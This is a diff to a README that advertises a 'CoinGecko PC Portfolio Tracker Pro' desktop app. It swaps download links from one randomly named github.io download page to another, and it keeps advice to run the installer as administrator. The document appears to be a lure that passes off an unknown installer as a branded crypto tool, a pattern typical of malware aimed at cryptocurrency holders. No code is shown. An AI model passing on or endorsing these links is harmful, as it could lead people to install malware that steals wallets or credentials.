@@ -2,7 +2,7 @@
 
 CoinGecko PC Portfolio Tracker Pro is a comprehensive desktop application designed for cryptocurrency investors and traders. It harnesses the power of the CoinGecko API to deliver real-time market data, portfolio management, and advanced analytics tools, making it an essential tool for anyone looking to optimize their crypto investments. This guide covers everything you need to know about setting up and using CoinGecko PC to its full potential.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -49,6 +49,6 @@ For installation problems, try running the installer as an administrator, tempor
 
 Ready to enhance your cryptocurrency management? Download CoinGecko PC Portfolio Tracker Pro now and take control of your investments with powerful tools and real-time insights.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is continuously updated to provide the best experience, so check back regularly for new features and improvements.
